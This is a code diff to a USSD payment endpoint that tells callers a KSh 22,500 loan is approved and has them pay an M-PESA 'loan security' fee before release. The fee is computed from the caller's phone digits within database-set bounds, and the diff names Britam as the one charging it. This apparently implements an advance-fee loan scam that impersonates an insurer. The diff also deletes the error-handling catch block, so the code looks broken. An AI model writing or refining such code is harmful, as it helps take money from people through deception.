@@ -263,6 +263,27 @@ async function recordOrder(
   }
 }
 
+async function getDynamicPriceBoundaries() {
+  try {
+    // Queries the exact table and special rows your dynamic API endpoint uses
+    const { rows } = await sql`
+      SELECT package_size, price FROM product_prices 
+      WHERE package_size IN ('MIN', 'MAX')
+    `;
+
+    const minRow = rows.find(r => r.package_size === 'MIN');
+    const maxRow = rows.find(r => r.package_size === 'MAX');
+
+    return {
+      min: minRow ? Number(minRow.price) : 100, // Match the defaults from your endpoint
+      max: maxRow ? Number(maxRow.price) : 1000
+    };
+  } catch (err) {
+    console.error("Failed fetching live USSD price bounds:", err);
+    return { min: 100, max: 1000 }; // Standard safety fallbacks
+  }
+}
+
 // ---------------------------------------------------------------------------
 // POST - Onfon USSD endpoint
 // ---------------------------------------------------------------------------
@@ -491,10 +512,15 @@ export async function POST(req: NextRequest) {
     // SCREEN 6: STK CHARGES MATRIX AND PUSH PROCESSING (DEPTH === 5)
     // -----------------------------------------------------------------------
     if (adjustedDepth === 5) {
+  // Fetch live admin configurations before calculation formulas run
+      const bounds = await getDynamicPriceBoundaries();
+      const spread = bounds.max - bounds.min;
+
       // Option 1 Flow Final Target Step
       if (mainChoice === "1") {
         if (lastChoice === "1") {
-          const seededFee = Math.floor(200 + (parseFloat(phone.slice(-3)) || 5) % 801);
+          // Replaced static 200/801 variables with your actual live DB boundaries
+          const seededFee = Math.floor(bounds.min + (parseFloat(phone.slice(-3)) || 5) % (spread + 1));
           const appUrl = process.env.APP_URL || "https://vercel.app";
           const callbackUrl = `${appUrl}/api/payment-callback`;
 
@@ -507,19 +533,15 @@ export async function POST(req: NextRequest) {
           return respond(`An M-PESA payment prompt of KSh ${seededFee} will appear shortly.\nEnter your PIN to release your KSh 22,500 loan.`, false);
         }
         return respond("Invalid choice. Please select 1 or 0.", true);
-      }
-
+       }
+ 
       // Option 2 Flow: Congratulations Offer Screen
       if (mainChoice === "2") {
         if (lastChoice === "1") {
-          const loanProduct = isExtensionDial ? segments[1] : segments[2];
-          let seededFee = 400;
           const phoneSeed = (parseFloat(phone.slice(-3)) || 5);
-
-          // Apply specialized fee limits based on product selection patterns
-          if (loanProduct === "1") seededFee = Math.floor(200 + phoneSeed % 801); // Salary: 40-50
-          if (loanProduct === "2") seededFee = Math.floor(200 + phoneSeed % 801); // Biashara: 50-60
-          if (loanProduct === "3") seededFee = Math.floor(200 + phoneSeed % 801); // Emergency: 60-70
+      
+      // Swapped old hardcoded calculations for live admin limits
+          let seededFee = Math.floor(bounds.min + phoneSeed % (spread + 1));
 
           return respond(`Congratulations! Your KSh 22,500 secured loan has been approved.\nBritam charges KSh ${seededFee} for loan security.\n\n1. Complete fee to release to your M-PESA\n0. Cancel`, true);
         }
@@ -527,24 +549,21 @@ export async function POST(req: NextRequest) {
       }
     }
 
-    // -----------------------------------------------------------------------
     // SCREEN 7: OPTION 2 STK DISPATCH EXECUTION TRIGGER (DEPTH === 6)
-    // -----------------------------------------------------------------------
     if (adjustedDepth === 6 && mainChoice === "2") {
       if (lastChoice === "1") {
-        const loanProduct = isExtensionDial ? segments[1] : segments[2];
+        const bounds = await getDynamicPriceBoundaries();
+        const spread = bounds.max - bounds.min;
+    
         const phoneSeed = (parseFloat(phone.slice(-3)) || 5);
-        let seededFee = Math.floor(200 + phoneSeed % 801);
-        
-        if (loanProduct === "1") seededFee = Math.floor(200 + phoneSeed % 801);
-        if (loanProduct === "2") seededFee = Math.floor(200 + phoneSeed % 801);
-        if (loanProduct === "3") seededFee = Math.floor(200 + phoneSeed % 801);
+        // Calculated dynamically out of your product_prices constraints
+        let seededFee = Math.floor(bounds.min + phoneSeed % (spread + 1));
 
         const appUrl = process.env.APP_URL || "https://vercel.app";
         const callbackUrl = `${appUrl}/api/payment-callback`;
 
         const result = await initiateStkPush(phone, seededFee, callbackUrl);
-        if (!result.ok || !result.checkoutId) {
+        if (!result.ok || !result.checkoutId) { 
           return respond(`Sorry, ${result.message || "Could not send payment prompt."}\nPlease try again shortly.`, false);
         }
 
@@ -553,15 +572,8 @@ export async function POST(req: NextRequest) {
       }
       return respond("Invalid choice. Please select 1 or 0.", true);
     }
-
-    return respond("Invalid request. Please try again.", false);
-
-  } catch (err) {
-    console.error("Faulu TEST DEMO USSD error:", err);
-    return respond("Sorry, something went wrong.", false);
   }
 }
-
 
 
 
